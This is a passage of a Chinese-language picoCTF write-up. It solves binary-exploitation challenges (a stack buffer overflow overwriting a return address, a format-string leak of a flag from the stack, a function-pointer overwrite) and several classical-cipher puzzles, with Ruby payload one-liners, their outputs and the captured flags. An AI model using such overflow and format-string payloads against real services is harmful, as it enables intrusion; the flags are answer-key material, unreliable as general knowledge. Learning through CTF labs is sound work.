3.0.0 :002 > s = "aaabacadaeafagahaiajakalamanaoapaqarasatauavawaxayazbabbbcbdbe
bfbgbhbibjbkblbmbnbobpbqbrbsbtbubvbwbxbybzcacbcccdcecfcgchcicjckclcmcncocpcqcrcs
ctcucvcwcxcyczdadbdcdddedfdgdhdidjdkdldmdndodpdqdrdsdtdudv"
 => "aaabacadaeafagahaiajakalamanaoapaqarasatauavawaxayazbabbbcbdbebfbgbhb... 
3.0.0 :003 > addr = "\x6e\x62\x6d\x62\x6c\x62\x6b\x62"
 => "nbmblbkb" 
3.0.0 :004 > s.index addr.reverse
 => 72
```

发现函数地址就是`0x4012ba`, 然后试试看能不能跳转运行. 

奇怪, 在本地可以运行, 但是在远程没有结果? 

```shell
> ruby -e ' print "a" * 72 + "\x00\x00\x00\x00\x00\x40\x12\x36".reverse ' | ./vuln 
Welcome to 64-bit. Give me a string that gets you the flag: 
NeSE{fake_flag}
zsh: done                              ruby -e ' print "a" * 72 + "\x00\x00\x00\x00\x00\x40\x12\x36".reverse ' | 
zsh: segmentation fault (core dumped)  ./vuln
> ruby -e ' print "a" * 72 + "\x00\x00\x00\x00\x00\x40\x12\x36".reverse ' | nc saturn.picoctf.net 53636
Welcome to 64-bit. Give me a string that gets you the flag:
```

看来还要一些操作才行. 
我多跳转几次, 让它不得不来听我的话: 

```ruby
puts "a" * 72 + "\x00\x00\x00\x00\x00\x40\x12\xd2".reverse
puts "a" * 72 + "\x00\x00\x00\x00\x00\x40\x12\x36".reverse
```

(以前见过类似的问题, 因为程序用了特定的函数, 会在跳转的时候, 
试图产生错误, 但是跳两次之后就会让程序放弃这个错误)

```shell
> ruby test.rb | nc saturn.picoctf.net 53636
Welcome to 64-bit. Give me a string that gets you the flag: 
Welcome to 64-bit. Give me a string that gets you the flag: 
picoCTF{b1663r_15_b3773r_964d9987}
```

### flag leak
观察代码, 发现漏洞的: 

```C
void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}
```

这里面有一个不安全的东西: (确切来说是一个不安全的组合)
因为`scanf("%127s", story);`读取了用户的输入, 
然后`printf(story);`直接将用户的输入不仅保护地输出了, 
于是就有格式化字符串漏洞. 所以试试看.

所谓的格式化字符串攻击可以利用类似的方法来进行攻击, 
不过这样的漏洞好像在编译的时候都会提醒的... 
但是在粗心的程序设计里面可能就会留下这样的漏洞. 
为了避免这样的漏洞, 可以`printf("%s", s);`来防止漏洞. 

多试试组合就好了: 

```shell
> ruby -e 'print "%p" * 100 ' | nc saturn.picoctf.net 50946
Tell me a story and then I'll tell you one >> Here's a story - 
0xffd13f200xffd13f400x80493460x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x2570250x6f6369700x7b4654430x6b34334c0x5f676e310x67346c460x6666305f0x3474535f0x635f6b630x343965320x7d6433650xfbad20000xc905a800(nil)0xf7fe69900x804c0000x8049410(nil)0x804c0000xffd140080x80494180x20xffd140b40xffd140c0(nil)0xffd14020(nil)(nil)0xf7ddcee5
```

```irb
> a = "0xffd13f200xffd13f400x80493460x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x2570250x6f6369700x7b4654430x6b34334c0x5f676e310x673
46c460x6666305f0x3474535f0x635f6b630x343965320x7d6433650xfbad20000xc905a800(nil)0xf7fe69900x804c0000x8049410(nil)0x804c0000xffd140080x80494180x20xffd140b40xffd140c0(nil)0xffd14020(nil)(nil)0xf7ddcee5".split("0x")
> def hexstr2str(hexstr)
>   str = ""
>   num = hexstr.to_i(16)
>   while num > 0
>     str << (num & 0xff).chr
>     num /= 0x100
>   end
>   str
> end
> a.each do |hexstr|
>   p hexstr2str(hexstr)
> end
...
"%p%"
"pico"
"CTF{"
"L34k"
"1ng_"
"Fl4g"
"_0ff"
"_St4"
"ck_c"
"2e94"
"e3d}"
"\x00 \xAD\xFB"
...
```

这样就看见了flag啦. 

注: 因为`printf`函数的格式化输出的特性会将它后面的值(也就是传入的参数), 
给格式化输出, 所以就可以利用这个特性糊弄计算机, 让它以为有传入的参数, 
于是就导致了计算机去读取栈上的其他信息, 然后就导致了读到了flag. 
并且可以利用类似的方法甚至可以在栈上面写任意的数据... 但是我不是很会. 
(以后学... )

### function overwriting
查看程序里面的东西, 发现里面的函数调用是通过一个全局变量来调用的. 
然后程序里面也有一个类似于全局变量的数组, 而这个数组有一个写的方法, 
而写的时候没有什么检测和保护措施. 所以想法就是把`hard_checker`换成
`easy_checker`, 因为前者是一个比较坑的函数, 是没法通过的. 
而后者就是个好捏的软柿子了. 

所以设置偏移量, 然后写入数据, 最后就能够让执行函数的时候把它给解决了. 

```shell
> ruby -e ' puts "a"*13+"L", "-16 -314" ' | nc saturn.picoctf.net 50134
Tell me a story and then I'll tell you if you're a 1337 >> On a totally unrelated note, give me two numbers. Keep the first one less than 10.
You're 1337. Here's the flag.
picoCTF{0v3rwrit1ng_P01nt3rs_698c2a26}
```

## Cryptography
说实话, 我对密码学是一窍不通, 现在的基本只能解决古典密码, 
但是对于现代的那些密码, 因为数学不过关, 导致基本不会. 
以后决定开始了解这些东西了... 

### basic mod 1 & 2
mod1的题目解释已经把要做的事情全部做完了: 

> We found this weird message being passed 
> around on the servers, we think we have
> a working decrpytion scheme.
>
> Download the message here.
> Take each number mod 37 and map it to the
> following character set: 0-25 is the
> alphabet (uppercase), 26-35 are the decimal
> digits, and 36 is an underscore.

其实题目的做法说的非常显然了, 所以我就不解释了. 

```ruby
map = ("A".."Z").to_a + ("0".."9").to_a + ["_"]
enc = open("message.txt").read.split(" ")
enc.each do |s|
  print map[s.to_i % 37]
end

# => R0UND_N_R0UND_ADD17EC2
```

mod2的时候, 有点丢脸, 因为我看不懂modular inverse... 
当时以为是负数, 愣是尬了好久, 直到我看了看hint, 
inverse是乘法的逆元... 

(我检讨, 我线性代数白学了, 在Z模base里面的逆元都不会求了, 
还要看hint才能想到. 太惨了)

```ruby
map = ("A".."Z").to_a + ("0".."9").to_a + ["_"]
enc = open("message.txt").read.split(" ")

def inverse(number, base = 41)
  base.times do |i|
    return i if number * i % base == 1
  end
end

enc.each do |s|
  print map[inverse(s.to_i) - 1]
end

# => 1NV3R53LY_H4RD_8A05D939
```

> Take each number mod 41 and find the modular 
> inverse for the result. Then map to the 
> following character set: 1-26 are the alphabet, 
> 27-36 are the decimal digits, and 37 is an underscore.

### credstuff
> We found a leak of a blackmarket website's login 
> credentials. Can you find the password of the user 
> cultiris and successfully decrypt it?
> 
> Download the leak here.
> The first user in `usernames.txt` corresponds to the 
> first password in `passwords.txt`. The second user 
> corresponds to the second password, and so on.

将压缩包解压后: 

```shell
> cat leak/passwords.txt
CMPTmLrgfYCexGzJu6TbdGwZa
GK73YKE2XD2TEnvJeHRBdfpt2
UukmEk5NCPGUSfs5tGWPK26gG
kaL36YJtvZMdbTdLuQRx84t85
...
> cat leak/usernames.txt
engineerrissoles
icebunt
fruitfultry
celebritypentathlon
...
```

太怪了. 完全没有什么想法. 难道我要从用户的密码里面匹配密码模式和规律吗? 
还是什么的...

好吧, 我的想法太怪了, 原来真实的想法是要找到对应用户的对应密码...
这个就像是网站的数据库泄漏了, 用户的密码和名字都流出来了. 

```ruby
pwd = open("leak/passwords.txt").read.split("\n")
usr = open("leak/usernames.txt").read.split("\r\n")

index = usr.index "cultiris"
pwd[index]
# => "cvpbPGS{P7e1S_54I35_71Z3}"
```

这里有两个坑爹的东西: 
* 一个是usr的那个, 换行符比较坑爹
* 还有一个是, pwd[377]还是一个加密的, 不过好在这个加密形式比较眼熟
  猜测为rot13, 然后一发入魂. 

`picoCTF{C7r1F_54V35_71M3}`

### morse code
做题前: 就这? 不过摩斯电码嘛, 简单. 拿到题之后, 我人傻了, 
为什么这个速度这么快? 为什么这么难听懂... 呜呜呜

(听是不可能听出来的, 听不出来, 所以用[波形查看](https://mp3cut.net), 
然后Morse Code[解码](https://morsecode.world/international/translator.html), 
不过是在没有想到的是, 题目还有小写字符和停顿的下划线要求, 
尝试了好多遍才成功. 唉)

### rail fence
栅栏编码加密... 

> A type of transposition cipher is the rail fence cipher, 
> which is described [here](https://en.wikipedia.org/wiki/Rail_fence_cipher). 
> Here is one such cipher encrypted using the rail fence 
> with 4 rails. Can you decrypt it?

直接使用[cyberchef](https://gchq.github.io/CyberChef), 
得到结果: `The flag is: WH3R3_D035_7H3_F3NC3_8361N_4ND_3ND_D00AFDD3`, 
解决.

### substitution 0 & 1 & 2
就是替换字符, 只不过难度不一样, 0的那个是直接在顶部提供了替换规则, 
然后1的那个可以利用标点符号来配合猜词, 然后2删掉了标点, 所以就麻烦了. 

为了匹配1和2, 我做了一个比较无聊的小程序来替换: 

```ruby
# 导入彩色打印输出的库
require "colorize"

# 对单词的出现次数进行一个分析
def anlysis(enc)
  hash = Hash.new(0)
  enc.each_char do |c|
    hash[c.downcase] += 1
  end
  ("a".."z").each do |c|
    if hash[c] > 0
      print c, ", ", hash[c], "\n"
    end
  end
end

# 输出修改过的字符串
def test(enc, alphabet, substitution)
  enc.each_char do |c|
    if i = substitution.index(c)
      print alphabet[i].colorize(:green)
    else
      print c
    end
  end
  print "\n"
end

# 撤销前一步的操作
def undo(alphabet, substitution)
  2.times do
    alphabet.pop
    substitution.pop
  end
end

# 列出已有的替换规则
def list(alphabet, substitution)
  i = alphabet.length - 1
  while i >= 0
    print alphabet[i], " <-> ", substitution[i], "\n"
    i -= 2
  end
end

# 列出剩下的需要替换的字母
def remain(alphabet)
  ("A".."Z").each do |c|
    unless alphabet.include? c
      print c, ", "
    end
  end
  print "\n"
end

# 增加新的替换规则
def add(char, alphabet, substitution)
  if substitution.include? char
    puts "already in. "
  else
    print "original character: "
    original = gets.strip
    substitution << char.downcase
    alphabet << original.downcase
    substitution << char.upcase
    alphabet << original.upcase
  end
end

# 读取曾经的匹配规则
def ld(alphabet, substitution)
  data = open("save").read.split("\n")
  data[0].split(" ").each do |w|
    alphabet << w
  end
  data[1].split(" ").each do |w|
    substitution << w
  end
end

# 保存
def save(alphabet, substitution)
  File.open("save", "w") do |f|
    f.write alphabet.join(" ") + "\n" + substitution.join(" ")
  end
end

# 字母表
alphabet = []
# 对应字母表的替换规则
substitution = []
# 读取文件
enc = open("message.txt").read

# 首先输出
puts "The encoded text is :"
puts enc

puts "And give you the anlysis: "
anlysis(enc)

loop do
  print "substitution character (or commands): "
  get = gets.strip
  case get
  when "exit"
    break
  when "undo"
    undo(alphabet, substitution)
  when "list"
    list(alphabet, substitution)
  when "load"
    alphabet = []
    substitution = []
    ld(alphabet, substitution)
  when "save"
    save(alphabet, substitution)
  when "remain"
    remain(alphabet)
  else
    if get.length > 1
      puts "invaild command"
    else
      add(get[0], alphabet, substitution)
    end
  end
  test(enc, alphabet, substitution)
end
```

然后替换的时候就可以有一个比较好的体验了. 

(注: 其实还可以做一个小小的弊, 因为我知道flag的形式是picoCTF的开头的, 
所以我可以有一些简单的小提示了. 甚至也可以利用词频出现的次数来判断. )

### transposition trial
> Our data got corrupted on the way here. 
> Luckily, nothing got replaced, but every 
> block of 3 got scrambled around! The 
> first word seems to be three letters long, 
> maybe you can use that to recover the rest 
> of the message.

```ruby
# 从左到右旋转
def rot(str)
  str[-1] + str[0..-2]
end

enc = open("message.txt").read

i = 0
while i + 2 < enc.length
  print rot(enc[i..(i+2)])
  i += 3
end

# => The flag is picoCTF{7R4N5P051N6_15_3XP3N51V3_A9AFB178}
```

也不是特别难... 

### Vigenere
> Decrypt this message using this key "CYLAB".

根据名字的提示, 放到cyberchef里面, 一键通关. 
`picoCTF{D0NT_US3_V1G3N3R3_C1PH3R_2951a89h}`

等我以后再来看看吧. 

[维基百科](https://en.wikipedia.org/wiki/Vigenère_cipher)

### diffie hellman
> Alice and Bob wanted to exchange information secretly. 
> The two of them agreed to use the Diffie-Hellman key 
> exchange algorithm, using p = 13 and g = 5. They both 
> chose numbers secretly where Alice chose 7 and Bob 
> chose 3. Then, Alice sent Bob some encoded text (with 
> both letters and digits) using the generated key as the 
> shift amount for a Caesar cipher over the alphabet and 
> the decimal digits. Can you figure out the contents 
> of the message?
> 
> Hints
> * Diffie-Hellman key exchange is a well known algorithm for 
>   generating keys, try looking up how the secret key is generated
> * For your Caesar shift amount, try forwards and backwards.

关于这个Diffie-Hellman Key Exchange Algorithm

$$A = g^a \mathrm{mod} p\\
  B = g^b \mathrm{mod} p\\
  s_A = B^a \mathrm{mod} p\\
  = g^{a b} \mathrm{mod} p\\
  = A^b \mathrm{mod} p = s_B$$

一般使用非常大的$a, b, g$来保证不被暴力破解. 

但是还是有中间人窃听的问题.

其实可以爆破的. 毕竟最终的是凯撒位移进行的加密. 那么不久得了, 
每一个位移都是过去不久好了. 

好吧, 我开玩笑的. 

C4354R_C1PH3R_15_4_817_0U7D473D_3A2BF44E

(注: 这个的凯撒位移的加密方法好像还有点坑爹: 
```ruby
def caesar(text, offset, alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
  text.each_char do |c|
    if i = alphabet.index(c)
      i += offset
      i %= alphabet.length
      print alphabet[i]
    else
      print c
    end
  end
end
```

## 后记
可以说, 确实不是特别难. 但是我很菜. 

希望我会慢慢变强...
